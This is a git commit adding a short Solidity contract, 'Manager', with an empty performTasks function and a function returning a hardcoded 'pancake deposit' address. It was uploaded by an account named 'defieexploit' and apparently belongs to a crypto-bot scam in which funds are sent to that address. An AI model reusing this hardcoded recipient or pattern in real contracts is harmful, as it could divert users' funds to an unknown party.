7551f9d26db427da034cee9082bed32e0569fd34
defieexploit <87881943+defieexploit@users.noreply.github.com>
2021-07-29 17:41:49 -0400

    Add files via upload

---
+++ PairRouter.sol
@@ -0,0 +1,11 @@
+﻿pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x94E203542996FC500d6945240B44F5B0E0B084d8;
+	}
+}
